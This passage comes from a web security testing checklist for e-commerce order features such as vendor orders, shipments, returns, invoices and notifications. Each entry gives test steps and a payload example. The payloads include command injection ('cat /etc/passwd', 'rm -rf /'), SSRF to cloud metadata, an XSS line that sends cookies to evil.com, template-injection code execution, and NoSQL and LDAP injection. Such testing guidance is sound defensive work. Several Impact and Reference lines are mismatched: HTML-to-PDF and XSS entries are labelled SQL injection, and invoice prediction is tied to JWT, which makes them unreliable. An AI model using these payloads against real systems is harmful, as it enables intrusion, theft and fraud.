**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. As a customer or competing vendor enumerate vendor order endpoints. 2. Attempt to access vendor management functions. 3. Check for credential or session exposure.

**Expected Result:** Application must strictly separate vendor authentication and authorization from customer flows.

**Payload Example:**

```
GET /api/vendor/V002/orders; PUT /api/vendor/V002/settings using V001 or customer credentials
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-154 — Order Splitting Logic Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. Place a multi-vendor order. 2. Intercept and manipulate the order splitting logic. 3. Try to assign items from Vendor A to Vendor B or combine separate vendor orders.

**Expected Result:** Application must correctly split orders by vendor server-side and not accept client-directed vendor assignments.

**Payload Example:**

```
Modify vendor_id assignments in order items to redirect items between vendors
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-155 — Partial Shipment Status Tampering
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. Intercept partial shipment status update. 2. Change status from shipped to delivered prematurely. 3. Check if the status change triggers early refund or payment release.

**Expected Result:** Application must validate shipment status transitions and require carrier confirmation before marking delivered.

**Payload Example:**

```
Change shipment_status=shipped to shipment_status=delivered without carrier confirmation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-156 — NoSQL Injection in Order Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. If the backend uses NoSQL database inject NoSQL payloads in order fields. 2. Submit and check for authentication bypass or data extraction.

**Expected Result:** Application must sanitize all inputs and use parameterized queries even for NoSQL databases.

**Payload Example:**

```
{"shipping_address":{"$gt":""};"$where":"sleep(5000)"} or {"user_id":{"$ne":null}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** Burp Suite;NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## ORD-157 — LDAP Injection in Order Processing
**Test Category:** Injection (WSTG-INPV-06) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. If order processing integrates with LDAP inject LDAP payloads in user-related fields. 2. Observe the response for LDAP errors or bypass.

**Expected Result:** Application must sanitize all inputs used in LDAP queries and use parameterized LDAP operations.

**Payload Example:**

```
shipping_name=*)(uid=*))(|(uid=* or customer_name=admin)(&)
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## ORD-158 — Command Injection in Order Processing
**Test Category:** Injection (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. If order fields are processed by server-side commands inject OS command payloads. 2. Check for command execution indicators in the response.

**Expected Result:** Application must never pass user input directly to OS commands and must use safe APIs.

**Payload Example:**

```
order_reference=ORD001;cat /etc/passwd or shipping_label=test`whoami`
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite;Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## ORD-159 — Broken Access Control via API Versioning
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Try accessing order history via older API versions. 2. Check if deprecated endpoints lack authorization checks. 3. Try /api/v1/orders vs /api/v2/orders.

**Expected Result:** Application must enforce consistent authorization checks across all API versions.

**Payload Example:**

```
GET /api/v1/orders (may lack auth checks); GET /api/v0/orders; GET /api/internal/orders
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-160 — Tracking Number Format Validation Bypass
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. Submit tracking queries with special characters or excessively long tracking numbers. 2. Check for error messages or unexpected behavior. 3. Test boundary values.

**Expected Result:** Application must validate tracking number format against expected patterns and handle invalid input gracefully.

**Payload Example:**

```
tracking_id=<script>alert(1)</script>; tracking_id=A*10000; tracking_id=null; tracking_id=undefined
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ORD-161 — Cancellation Fee Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. If cancellation incurs a fee intercept the cancellation request. 2. Modify cancellation_fee parameter to 0. 3. Check if cancellation processes without fee.

**Expected Result:** Application must calculate cancellation fees server-side based on business rules and not accept client-provided fee amounts.

**Payload Example:**

```
Change cancellation_fee=25.00 to cancellation_fee=0.00 in cancellation request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-162 — Modification After Payment Capture
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. After payment is captured attempt to modify order to add items. 2. Check if items are added without additional payment. 3. Verify payment recalculation.

**Expected Result:** Application must either recapture payment or prevent modification after payment is already captured.

**Payload Example:**

```
PUT /api/orders/modify adding items after payment_status=captured
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-163 — Return Label Generation SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. If return process generates shipping labels and accepts any URL parameters test for SSRF. 2. Point URL to internal services. 3. Check for server-side request.

**Expected Result:** Application must validate all URLs used in label generation and prevent access to internal resources.

**Payload Example:**

```
label_callback=http://169.254.169.254/ or return_label_url=http://localhost:9200/_cat/indices
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ORD-164 — Invoice Number Prediction and Fraud
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Generate multiple invoices and note the numbering pattern. 2. Predict future invoice numbers. 3. Attempt to create or access predicted invoices.

**Expected Result:** Application must use cryptographically random invoice identifiers that cannot be predicted.

**Payload Example:**

```
Predict INV-2024-001234 based on pattern INV-2024-001230 through INV-2024-001233
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-165 — Delivery Fee Manipulation Based on Schedule
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Select express delivery and intercept request. 2. Change delivery_type to standard but keep express time slot. 3. Check if express delivery is received at standard price.

**Expected Result:** Application must validate delivery type and scheduling consistency server-side and charge appropriate fees.

**Payload Example:**

```
Change delivery_type=express to delivery_type=standard while keeping express time_slot
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-166 — Template Injection in Notification Templates
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. If notification content uses user data inject template syntax in order fields. 2. Check if template engine processes the injection when notification is generated.

**Expected Result:** Application must sanitize all dynamic data before inserting into notification templates.

**Payload Example:**

```
customer_name={{7*7}} or order_note=${Runtime.getRuntime().exec('id')} appearing in notification
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ORD-167 — Shipping Method Downgrade While Keeping Price
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Select premium shipping and proceed to checkout. 2. Intercept request and change shipping_method to standard. 3. Keep the original total. 4. Check if price is not recalculated.

**Expected Result:** Application must recalculate totals server-side when shipping method changes.

**Payload Example:**

```
Change shipping_method=premium to shipping_method=free while total remains unchanged
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-168 — Tax Calculation Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order and intercept the request. 2. Modify tax_amount to 0 or remove tax parameters. 3. Submit and verify if order processes without tax.

**Expected Result:** Application must calculate taxes server-side based on delivery address and applicable tax rules.

**Payload Example:**

```
Change tax_amount=8.99 to tax_amount=0.00 or remove tax_amount parameter entirely
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-169 — Address Validation Bypass for Restricted Products
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Order a product restricted to certain regions. 2. Use an address outside the permitted region. 3. Bypass frontend validation and submit via API. 4. Check if order is accepted.

**Expected Result:** Application must validate shipping address restrictions server-side for regulated or restricted products.

**Payload Example:**

```
Order age-restricted or region-locked product with shipping_address in restricted zone via direct API call
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-170 — Insecure Token in Confirmation URL
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Analyze the order confirmation URL for tokens or identifiers. 2. Check if the token is predictable or reusable. 3. Test if the token expires appropriately.

**Expected Result:** Application must use cryptographically random tokens in confirmation URLs that expire after first use.

**Payload Example:**

```
Analyze token entropy in /order/confirm?token=abc123; check if token is sequential or low-entropy
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## ORD-171 — Export Function Command Injection
**Test Category:** Injection (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. Use the order history export feature. 2. If filename or format is user-controllable inject OS command payloads. 3. Check for command execution.

**Expected Result:** Application must sanitize all user input used in file generation and never pass it to OS commands.

**Payload Example:**

```
export_filename=orders.csv;cat /etc/passwd or format=csv|whoami
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite;Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## ORD-172 — Tracking Information Disclosure via Referer Header
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. Visit the order tracking page. 2. Click any external link on the page. 3. Check if the Referer header leaks tracking information to the external site.

**Expected Result:** Application must set Referrer-Policy: no-referrer on tracking pages to prevent tracking data leakage via Referer header.

**Payload Example:**

```
Check Referer header after clicking external link on tracking page for tracking_id exposure
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-173 — Bulk Cancellation API Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. If a bulk cancellation API exists test it with a wide range of order IDs including other users' orders. 2. Check if authorization is enforced per-order.

**Expected Result:** Application must validate ownership of every order in a bulk cancellation request individually.

**Payload Example:**

```
POST /api/orders/bulk-cancel with order_ids=[1001;1002;1003;1004] including orders from other users
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-174 — HTTP Parameter Pollution on Modification
**Test Category:** Input Validation (WSTG-INPV-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Send order modification with duplicate parameters. 2. Use both GET and POST with conflicting values. 3. Check which value the server processes.

**Expected Result:** Application must handle duplicate parameters consistently and reject ambiguous requests.

**Payload Example:**

```
PUT /api/orders/modify?order_id=1001&order_id=1002 or body: order_id=1001&order_id=1002
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ORD-175 — Return Fraud via Quantity Mismatch
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Order multiple items. 2. Submit return request claiming more items than purchased. 3. Check if excess return quantity is accepted.

**Expected Result:** Application must validate return quantity against original order quantity and reject excess returns.

**Payload Example:**

```
Return return_quantity=10 for an item with ordered_quantity=2
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-176 — Reorder Endpoint Authorization Check
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Access the reorder endpoint. 2. Test with expired tokens or tokens from other users. 3. Verify proper authentication and authorization enforcement.

**Expected Result:** Application must validate authentication and authorization for all reorder requests.

**Payload Example:**

```
POST /api/reorder with expired JWT or another user's session token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;jwt_tool

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-177 — HTML to PDF Injection in Invoice
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. If invoices are generated as PDF from HTML inject HTML or JavaScript in invoice data fields. 2. Generate the invoice. 3. Check if injection is rendered in PDF.

**Expected Result:** Application must sanitize all dynamic data before PDF generation and restrict PDF renderer capabilities.

**Payload Example:**

```
customer_name=<iframe src='http://internal-server/admin'></iframe> in invoice generation
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-178 — Calendar Manipulation for Exclusive Slots
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Check delivery scheduling calendar. 2. Manipulate date parameters to access hidden or exclusive delivery slots. 3. Book slots not normally available.

**Expected Result:** Application must validate slot availability server-side and not expose hidden or exclusive slots through parameter manipulation.

**Payload Example:**

```
Change delivery_slot_id to premium or internal slot IDs not shown in UI
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-179 — Stored XSS via Gift Card Message on Receipt
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. Order with gift wrapping and add a message. 2. Include persistent XSS payload in the message. 3. When the recipient views the gift receipt check for execution.

**Expected Result:** Application must sanitize gift messages on both input and output to prevent stored XSS across user contexts.

**Payload Example:**

```
gift_card_message=Enjoy! <script>new Image().src='https://evil.com/steal?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-180 — Vendor Payment Redirect Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. In multi-vendor setup intercept vendor payout or settlement requests. 2. Modify vendor bank details or payout destination. 3. Check if manipulation is accepted.

**Expected Result:** Application must verify vendor identity before processing payouts and require re-authentication for payment detail changes.

**Payload Example:**

```
Change vendor_bank_account in payout request to attacker-controlled account
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-181 — Partial Delivery Confirmation Spoofing
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Partial Shipment

**Test Steps:** 1. Attempt to confirm delivery of a partial shipment without valid carrier confirmation. 2. Spoof delivery confirmation via API. 3. Check if payment is released.

**Expected Result:** Application must verify delivery confirmation with carrier systems before triggering payment release.

**Payload Example:**

```
POST /api/shipments/SHIP-1001/confirm-delivery with spoofed carrier_confirmation=true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-182 — Notification Preference Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Status Notifications

**Test Steps:** 1. Update notification preferences. 2. Inject payloads in preference fields like notification_email or phone. 3. Check for injection vulnerabilities.

**Expected Result:** Application must validate and sanitize all notification preference inputs including email and phone fields.

**Payload Example:**

```
notification_email=test@test.com<script>alert(1)</script> or notification_phone=+1234567890;rm -rf /
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-183 — Weak Idempotency Key Implementation
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Place an order with an idempotency key. 2. Modify the order details but keep the same idempotency key. 3. Check if the new modified order is processed.

**Expected Result:** Application must properly implement idempotency by rejecting requests with reused keys regardless of modified content.

**Payload Example:**

```
Reuse Idempotency-Key: key123 with different order content in POST /api/orders
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-184 — Inventory Reservation Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Place Order

**Test Steps:** 1. Add items to cart and proceed to checkout without completing order. 2. Repeat to reserve all inventory. 3. Check if other users are blocked from purchasing.

**Expected Result:** Application must implement reservation timeouts and limit the number of concurrent reservations per user.

**Payload Example:**

```
Repeatedly start checkout for limited-stock items without completing to block inventory
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## ORD-185 — Confirmation Bypass to Skip Payment
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Confirmation

**Test Steps:** 1. Intercept the order flow between payment and confirmation. 2. Skip the payment step and directly call the confirmation endpoint. 3. Check if order is confirmed without payment.

**Expected Result:** Application must verify payment completion server-side before generating order confirmation.

**Payload Example:**

```
Directly call POST /api/orders/confirm without completing POST /api/payments/process
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-186 — Sensitive Data in Client-Side Storage
**Test Category:** Information Disclosure (WSTG-CLNT-11) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order History

**Test Steps:** 1. After viewing order history inspect browser localStorage and sessionStorage. 2. Check for cached sensitive order data. 3. Verify data is cleared on logout.

**Expected Result:** Application must not store sensitive order data in client-side storage or must encrypt and clear it properly.

**Payload Example:**

```
Check localStorage for keys like orderHistory; recentOrders; cachedOrderData containing sensitive info
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-187 — Tracking API Rate Limit Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. Send rapid tracking queries for different tracking IDs. 2. Check if rate limiting is implemented per-user or per-IP. 3. Try bypassing with X-Forwarded-For header.

**Expected Result:** Application must implement robust rate limiting that cannot be bypassed via header manipulation.

**Payload Example:**

```
Add X-Forwarded-For: 1.2.3.4 to bypass IP-based rate limiting on tracking queries
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ORD-188 — Cancellation Notification Manipulation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Cancel an order. 2. Intercept the cancellation notification. 3. Check if notification content can be manipulated to mislead the user.

**Expected Result:** Application must generate cancellation notifications from server-side data without accepting user-controlled notification content.

**Payload Example:**

```
Modify notification_message or reason in cancellation request to inject misleading information
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---
